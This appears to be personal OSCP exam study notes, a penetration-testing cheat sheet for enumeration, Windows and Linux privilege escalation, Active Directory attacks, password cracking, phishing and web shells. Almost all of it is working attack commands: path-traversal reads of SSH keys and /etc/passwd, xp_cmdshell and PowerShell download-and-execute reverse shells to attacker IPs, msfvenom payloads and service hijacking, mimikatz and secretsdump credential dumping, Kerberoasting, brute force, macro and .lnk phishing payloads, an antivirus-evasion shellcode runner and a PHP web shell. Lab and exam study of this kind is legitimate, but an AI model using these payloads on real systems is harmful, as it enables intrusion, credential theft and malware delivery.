By default, SSH searches for id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa  | 
-     curl http://rssoftwire.com/raman/index.php?page=../../../../../../../../../home/raman/.ssh/id_rsa
with encode
-     curl http://192.168.10.10/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

SSL Enumeration 
-     Open a connection openssl s_client -connect $ip:443
Port 161 UDP:
This will give you the username password or any hint for login
It will get with autorecon (UDP Port)
-     nmap -sU -p161 --script "snmp-*" $ip
-     nmap -n -vv -sV -sU -Pn -p 161,162 –script=snmp-processes,snmp-netstat IP
-     snmpwalk -v 1 -c public 192.168.10.10  NET-SNMP-EXTEND-MIB::nsExtendOutputFull (this is command I have used in 2 3 machine to find username, password, or hint of user and pass
-     evil-winrm -I 192.168.10.10 -u ‘raman’ -p ‘ramanpassword’  (login with this command)
PORT 139, port 445  (also PORT 137 (name services) & PORT 138 (datagam) UDP netbios)
Always check guest login and then check public share with write and execute permission and you will find credential, files pdf ps1 etc
-     mount -t cifs //10.10.10.134/Backups /mnt/remote -o username=" ",password=" ",uid=$(id -u),gid=$(id -g)   (mount SMB shares)
-     nmap -v -script smb-vuln* -p 139,445 10.10.10.10
-     smbmap -H 192.168.10.10   (public shares) (check read write and execute)
-     smbmap -H 192.168.10.10 -R tmp   (check specific folder like tmp)
-     enum4linux -a 192.168.10.10   (best command to find details and users list)
-     smbclient //10.10.10.134/Backups -U " "%" "   (anonymous login)
-     smbclient -p 4455 -L //192.168.10.10/ -U raman --password=raman1234 (linux)
-     smbclient -p 4455 //192.168.10.10/scripts -U raman --password raman1234  (login)
Port 3389 RDP
There are two methods for this port: one involves finding credentials with another port, and the other employs brute force.
There is only one method to find credentials on this port, which involves a brute force attack using Hydra
-     hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
then further login with xfreerdp
-     xfreerdp /v:raman /u:passwordraman /p:192.168.10.10 /workarea /smart-sizing
-     rdesktop $ip
PORT 3306 MySQL
Find credential with other port and use default to login
-     nmap -sV -Pn -vv -script=mysql* $ip -p 3306
-     mysql -u root -p 'root' -h 192.168.10.10 -P 3306
-     select version(); | show databases;  | use databse | select * from users; | show tables |  select system_user(); | SELECT user, authentication_string FROM mysql.user WHERE user = Pre
MSSQL 1433, 4022, 135, 1434, UDP 1434
For this port, you can find credentials from another port and log in with ipacket-mssqlclient. check HackTricks for exploitation
-     nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
-     impacket-mssqlclient raman:'raman@321@1!'@192.168.10.10
-     impacket-mssqlclient Administrator: 'raman@321@1!'@192.168.10.10 -windows-auth
-     mssqlclient.py -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
-     SELECT @@version;  | SELECT name FROM sys.databases;  | SELECT  FROM offsec.information_schema.tables;  |  select  from offsec.dbo.users;
Steal NTLM hash using responder
-     exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
Connect as CMD database
-     SQL> EXECUTE sp_configure 'show advanced options', 1;
-     SQL> RECONFIGURE;
-     SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
-     SQL> RECONFIGURE;
-     EXEC xp_cmdshell 'whoami';
-     exec xp_cmdshell 'cmd /c powershell -c "curl 192.168.10.10/nc.exe -o C:\windows\temp\nc.exe"';
-     exec xp_cmdshell 'cmd /c dir C:\windows\temp';
-     exec xp_cmdshell 'cmd /c "C:\windows\temp\nc.exe 192.168.10.10 443 -e cmd"';
Get Reverse Shell
-     EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
also applied on SQL Injection login
PORT 5437 & PORT 5432 PostgreSQL
If you find this port, follow the commands below, and you can easily find credentials from another port as well
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7
-     msf6 exploit(linux/postgres/postgres_payload) > options and set all values rhost lhost port LHOST  tun0
-     OR | psql -U postgres -p 5437 -h IP  |  select pg_ls_dir(‘./’);  | select pg_ls_dir(‘/etc/password’);  | select pg_ls_dir(‘/home/wilson’);  | select pg_ls_dir(‘/home/Wilson/local.txt’);
2. Windows Privilege Escalation
I have used this approach:
Run whoami /all (if enabled, then use printspoofer or got potato).
Simply run PowerUp, then find privileges on unquoted DLL, etc.
Upload WinPEAS for further enumeration if the above does not work. WinPEAS mostly finds plaintext passwords.
Lastly, find any executable (exe), PowerShell script (ps1), or PDF file running. Run it for further enumeration and search on Google for additional details.
Upload
-     certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1 ( only run on cmd)
-     iwr -uri http://192.168.10.10/PowerUp.ps1 -Outfile PowerUp.ps1 (power shell)
-     curl 192.168.10.10/PowerUp.ps1 -Outfile PowerUp.ps1 (both)
-     Start http server with python3 -m http.server 80 or 81 etc
Plaintext Password
-     Folders Name: C Folder | Document Folder
To find a password
-     run winpeas
-     check history with command
-     check exe files in C or desktop etc
-     \users\raman\documents\fileMonitorBackup.log
File Permission
F> Full access | M> Modify access |RX> Read and execute access| R>Read-only access| W>Write-only
-     icacls "C:\xampp\apache\bin\fida.exe"  (check permission)
 Automated Tools
Powerup     In the last line type Invoke-AllChecks
-     certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1
powershell -ep bypass .\PowerUp.ps1     OR
powershell -ep bypass | Invoke-AllChecks (check all possible vulnerability except plaintext passwd)     OR
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.14/PowerUp.ps1') | powershell -noprofile -   #download and execute (working)
Winpeas.exe (all including plaintext passwd)
Windpeas.exe If .net 4.5 (run otherwise)
-     certutil.exe -urlcache -split -f http://192.168.10.10:8080/winPEASx64.exe
-     .\winPEASx64.exe
 Manual Enumeration
-     Systeminfo   OR  systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
-     Hostname | Whoami | wmic qfe (updates and patches etc)
-     Wmic logicaldisk (drives)
-     echo %USERNAME% || whoami then $env:username
-     Net user | net user raman
-     Net localgroup | net localgroup raman
-     netsh firewall show state (firewall)
-     Whoami /priv
-     Ipconfig | ipconfig /all  |
-     netstat -ano | route print
-     Powershell | Get-LocalUser | Get-LocalGroup | Get-LocalGroupMember Administrators
-     Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname   (check software with version 32 bit and below 64)
-     Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-     Get-Process
If RDP is enable or we enable it then add this
-     net localgroup administrators /add
-     Unattended Windows Installatiom (old files of user n pass then crack)
-     dir /s sysprep.inf sysprep.xml unattended.xml unattend.xml *unattended.txt 2>null
GoldMine Password/plaintext
1st Technique (Common Password)
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
Readable location
-     findstr /si password .txt | .xml | *.ini
Registry  | (IF VNC install)
-     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" (autologin)
Configuration | files with winpeas
-     SAM  |winpeas (looking for common Sam and System backups)
Attacker machine move then dcrypt with tool creddump-master
./pwdump.py SYSTEM SAM
OR
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue (findbackup file)
Get-ChildItem -Path C:\xampp -Include .txt,.ini -File -Recurse -ErrorAction SilentlyContinue (check files) | type C:\xampp\passwords.txt | type C:\xampp\mysql\bin\my.ini
Get-ChildItem -Path C:\Users\dave\ -Include .txt,.pdf,.xls,.xlsx,.doc,.docx -File -Recurse -ErrorAction SilentlyContinue   (check doc txt etc)
Another goldmine powershell Get-History   | (Get-PSReadlineOption).HistorySavePath (found file then type raman.txt and if found command then do it because of taken root
cd C:\ | pwd | dir
 SeImpersonatePrivilege enable
Whoami /priv and Whoami /all
Printspoofer
curl 192.168.10.10/PrintSpoofer64.exe -o Pr.exe
.\Pr.exe -i -c cmd  OR .\PrintSpoofer32.exe -i -c powershell.exe
GODpotato
curl 192.168.10.10:8081/GodPotato-NET2.exe -o god.exe     OR
certutil.exe -urlcache -f http://10.10.16.8/GodPotato-NET2.exe GodPotato-NET2.exe
.\god.exe -cmd "cmd /c whoami"    OR
curl 192.168.10.10:8081/nc.exe -o nc.exe
.\god.exe -cmd "cmd /c C:\xampp\htdocs\cms\files\nc.exe 192.168.10.10 443 -e cmd"
.\god.exe -cmd "cmd /c C:\xampp\htdocs\cms\files\nc.exe 192.168.10.10 443 -e powershell"
Kernel Exploits
•         Biopath modifiable service
Get-ModifiableServiceFile
•         Permission check and service stop / start check
•         Msfvenom create shell and upload ( curl, iwr, certutil)
•         icacls "C:\Program Files"
•         msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f exe -o rev.exe
•         del "C:\program files\raman\raman.exe"
•         curl 192.168.10.10/rev.exe -o raman.exe
•         cp raman.exe "C:\program files\raman\"
•         net start raman
another way:
Get more information about the service
-     sc qc UsoSvc   #check BINARY_PATH_NAME
overwrite the binpath of the service
-     sc config <Service> binpath="C:\Users\mssql-svc\Desktop\nc.exe 10.10.16.14 9004 -e cmd.exe"
check the binary path again
-     sc stop <Service>     #stop the service
-     sc start <Service>    #start it again
 unquoted path
•         Get-UnquotedService
•         Permission check and service stop / start check
•         Msfvenom create shell and upload ( curl, iwr, certutil)
•         icacls "C:\Program Files"
•         msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f exe -o rev.exe
•         del "C:\program files\raman\raman.exe"
•         curl 192.168.10.10/rev.exe -o raman.exe
•         cp raman.exe "C:\program files\raman\"
•         net start raman
DLL Hijacking
•         Permission check and service stop / start check
•         Msfvenom create shell and upload ( curl, iwr, certutil)
•         icacls "C:\Program Files"
•         msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f dll -o rev.dll
•         del "C:\program files\raman\raman.dll"
•         curl 192.168.10.10/rev.dll -o raman.dll
•         cp raman.dll "C:\program files\raman\"
•         net start raman
 Task scduler/cron job
·         schtasks /query /fo LIST /v  (find taskName: \Microsoft\CacheCleanup)
·         icacls C:\Users\raman\Pictures\Cleanup.exe    user (I)(F) permission required)
•         iwr -Uri http://192.168.10.10/adduser.exe -Outfile Cleanup.exe
•         move .\Pictures\BackendCacheCleanup.exe Cleanup.exe.bak
•         move .\Cleanup.exe .\Pictures\  (waiting for the execution and put file just one before the folder)
Linux Privilege Escalation
Start with automated tools like LinPEAS, then proceed with manual enumeration. The following command is used to get a TTY shell
python3 -c 'import pty; pty.spawn(["/bin/bash", "--rcfile", "/etc/bash.bashrc"])' --> full access shell
Automated Tools
·         python -m http.server 80
·         wget http://192.168.10.10/linpeas.sh -o linpeas.sh
·         chmod +x linpeas.sh | ./linpeas.sh     | ( ./linpeas.sh | tee filename.txt  )
Manual Enumeration
Approach permission checker/cron job/
cmd: ls -la /etc/passwd/ | ls -la /etc/shadow -- > check read/write permission | sudo su
sudo -l ( https://gtfobins.github.io/#)
find / -user root -perm -4000 -print 2>/dev/null
getcap -r / 2>/dev/null (capabilities)(cap_setuid+ep)
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm 0777 | find / -writable -type d 2>/dev/null
cat /etc/crontab (normal) | grep "CRON" /var/log/syslog (wildcarts)
history | cat .bashrc
GoldMine Password/plaintext
Backup files
Kernel Search with Google
motd.legal-displayed
4. Active Directory.
Active OSCP is challenging for everyone, and soon I am going to create videos on YouTube. In Active Directory, there are three different machines: Machine01, Machine02, Domain01. The Machine01 machine always begins with initial enumeration and privilege escalation as a standalone. Please use the following steps to work on Active Directory:
1.       Run net user /domain.
2.       List users and run sharpHound.ps1 to find domain users (otherwise not in user list) and also with the steps below.
3.       Run secretdumps, and if you come from a reverse shell, then change the administrator password.
4.       For tunneling (use Chisel or run with SSH), if there is an issue, revert the machine.
5.       Find user and password from secretdumps, mimikatz c drive, config files, winpeas, etc.
6.       Check services with open ports such as 22, 1433, 5896, 5895, 445, etc.
7.       Use CrackMapExec with user and password, testing with the above services.
8.       Perform AS-REP Roasting with GetUserSPN.py or Rubeus.exe.
9.       If SQL, use mssqlclient.py; if SMB, use psexec.py; if WinRM or evil-winrm, check the administrator, then move to the next step to find the Windows root.
10.   For Domain01:
11.   Run secretsdump (Default administrator) with user pass or hash, same with psexec, winrm, SSH, etc.
12.   Directly rooted."
Machine01
After get privilege escalation then run following commands
·         Transfer SharpHound.ps1 to target & load in powershell ::
·         . . \SharpHound.ps1
·         Invoke-BloodHound -CollectionMethod All
·         Found users account domain01  (if you find user then don’t use below step)
·         transfer bloodhound.zip on kali
·         Create a new user (if you want or change administrator password)
·         net user raman raman@321 /add
·         net localgroup administrators raman /add
·         net user administrator raman@123 (password Changed of administrator)
·         run secret dump or use mimikatz to find user and password on machine01
·         use impacket for secret dump https://github.com/fortra/impacket
·         python3 ./secretsdump.py ./administrator: raman@123@192.168.10.10 (check domain users with oscp.exam specially default username and password
·         for MimiKatz   privilege::debug | token::elevate | sekurlsa::logonpasswords
Machine02
The first step is to start port forwarding, followed by running AS-REP Roasting with GetUserSPNs.py for Linux and Rubeus.exe for Windows. If neither method works, manually enumerate in Windows to find the username and password or again use mimikatz. If you are not an administrator, apply Windows privilege escalation techniques on it. This will help you gain privileges on Machine02.
·         run map on Macine02 with proxychains nmap -sT -sU -p22,161,135,139,445,88,3389 10.10.10.10
Port Forward with SSH   (if port 22 is open in machine01)
·         ssh -D 8001 -C -q -N raman@192.168.10.10
·         in /etc/proxychains4.conf  (add 127.0.0.1 9999)
·         socks5 127.0.0.1 8001
Port Forward with chisel
·         socks5 127.0.0.1 1080 add this in /etc/proxychains
·         ./chisel server -p 5555 --reverse
·         certutil -urlcache -split -f http://192.168.100.100/chisel-x64.exe
·         chisel client 192.168.100.100:5555 R:socks
·         this is best article for chisel installation
·         https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29
WINDOW Kerberoasting with window Machine02
·         .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
·         sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force
OR
./GetUserSPNs.py  For Macine02 
·         make user firewall if off and you are local admin etc)
·         proxychains python3 impacket-GetNPUsers oscp.exam/raman:raman@123 -dc-ip 10.10.100.100
·         sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force
If SQL, use mssqlclient.py; if SMB, use psexec.py; if WinRM or evil-winrm, check the administrator, then move to the next step to find the Windows root. If you find a lot of username and password then use crackmapexec for SMB, SQL, WinRm or evil-winrm
Domain01
·         run map on Domain01 with proxychains nmap -sT -sU -p22,161,445,88,3389 10.10.10.10
·         check nmap for login and use crackmapexec. If you don’t want to use nmap then
·         simply login with psexec,winrm or winexe
·         if you cant find the username and password then use different method like pass the hash, silver ticket
General information
Reverse Shell
•         Always copy the reverse shell from these links and check directly. If it doesn't work, then encode it with URL or encryption with base64.
•         https://www.revshells.com/
•         https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
Password cracking:
admin:admin admin:password root:root root:toor
Burpsuite if we want to
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt
sudo gzip -d rockyou.txt.gz
hydra -l raman -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.10.10
hydra -l raman -P /usr/share/wordlists/rockyou.txt 192.168.10.10 http-post
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.10.10 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
hashcat -b    | hashcat.exe -b    (linux and window  benchmark)
customize wordlists
head /usr/share/wordlists/rockyou.txt > demo.txt  | sed -i '/^1/d' demo.txt
if we want to add 1 in all password then | echo \$1 > demo.rule | hashcat -r demo.rule --stdout demo.txt
hash-identifier  (find hash if simple)
hashid    (if id is available "$2y$10$)
ssh2john id_rsa > ssh.hash | hashcat -h | grep -i "ssh"    (port22)
CRACK NTLM with MimiKatz 
TargetWindow Get-LocalUser | open powershell | cd C:\tools | ls (| already install if not then install it) | token::elevate (check user permission) | lsadump::sam (dump all user ntlm) |
KALI vim raman.hash (copy raman hash) | hashcat --help | grep -i "ntlm" (check mode like ntml 1000 value) | hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
Zip cracking
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
zip2john file.zip > zip.john
john zip.john
Port Kill
sudo fuser -k 443/tcp
- Client Side Attacks can be done through:
- HTML Application
- Canarytokens then use the following link to check victim's browser
-     https://explore.whatismybrowser.com/useragents/parse/
- cross-site scripting (stored)
- Microsoft Word Macros
-     Sub AutoOpen()  MyMacro  End Sub
-     Sub Document_Open()  MyMacro  End Sub
- encode the following PowerShell reverse shell
-     IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
-     msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hta-psh -o /home/raman/Desktop/payload.hta
- nishang reverse powershell with bypassing the double quotes. keep the Invoke-powershelltcp.ps1 ready then start http server and use the following command to get a shell
-     msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.9/Invoke-PowerShellTcp.ps1')\""
- use the following function to split the payload
-     str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..." n = 50 for i in range(0, len(str), n): print("Str = Str + " + '"' + str[i:i+n] + '"')
- paste the payload from the function in the macro
-     Sub MyMacro() Dim Str As StringStr = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU" Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd" Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"Str = Str + "A== " CreateObject("Wscript.Shell").Run Str End Sub
- Object linking and Embedding
- In CMD type the following
-     echo "START cmd.exe" > evil.bat
-     powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA...
- Go to Microsoft Word ==> Insert ==> Object ==> evil.bat
- Email Phishing Attack
- First we install and enable our webdav server
-     pip3 install wsgidav
-     pip3 install cheroot
-     sudo wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
- Then we create a config.Library.ms file with the following content. Notice the IP address.
-     <?xml version="1.0" encoding="UTF-8"?><libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"><name>@windows.storage.dll,-34582</name><version>6</version><isLibraryPinned>true</isLibraryPinned><iconReference>imageres.dll,-1003</iconReference><templateInfo><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType></templateInfo><searchConnectorDescriptionList><searchConnectorDescription><isDefaultSaveLocation>true</isDefaultSaveLocation><isSupported>false</isSupported><simpleLocation><url>http://192.168.45.239</url></simpleLocation></searchConnectorDescription></searchConnectorDescriptionList></libraryDescription>
- We craft a malicious File.lnk that contains our powershell payload.
-     powershell -c "iex(new-object net.webclient).downloadstring('http://192.168.45.239:1337/Invoke-PowerShellTcp.ps1')"
- we can send a malicious body.txt
-     Hi, please click on the attachment :D
- using smtp with swaks
-     swaks -t jim@relia.com --from test@relia.com --attach @config.Library-ms --server 192.168.186.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
- Antivirus Evasion
- Generate a payload from msfvenom
-     msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -i 10 -e x86/shikata_ga_nai -f powershell -v sc
- create a powershell named file.ps1 and save the following script into it with binary that you got from msfvenom
-     $code = '[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);'; $var1 = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru; [Byte[]]; [Byte[]]$var2 = <place your shellcode here>; $size = 0x1000; if ($var2.Length -gt 0x1000) {$size = $var2.Length}; $x = $var1::VirtualAlloc(0,$size,0x3000,0x40); for ($i=0;$i -le ($var2.Length-1);$i++) {$var1::memset([IntPtr]($x.ToInt32()+$i), $var2[$i], 1)}; $var1::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
- transfer the payload/PowerUp.ps1 to Windows machine
-     powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.2.10/file.ps1','file.ps1')
- Run the shell in Windows PowerShell
-     .\file.ps1
- you may need to change the policy
-     Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
- Injecting a payload in a program using shellter
- get an exe program from /usr/share/windows-binaries. Operation Mode A --> PE Target /usr/share/windows-binaries/whoami.exe --> Enable Stealth Mode --> Payload L then 1. Lastly launch msfconsole and /Multi/handler
- 

#WebShells 
file upload
if you can upload a file in ftp or smb server then upload nc.exe and shell.php "<?php system($GET['cmd']); ?>" then you can obtain a reverse shell
-     http://10.10.10.97/shell.php?cmd=nc.exe 10.10.10.16.3 9001 cmd/powershell/bash....
make a powershell shell ready from nishang and run a webserver then hit your webserver 

file upload using fupload and execution using fexec. you can use it if cmd is not working perfectly
tutorial --> https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/
<?php

    if (isset($_REQUEST['fupload'])) {

        file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.12:8888/" . $_REQUEST['fupload']));

    };

    if (isset($_REQUEST['fexec'])) {

        echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";

    };

?>
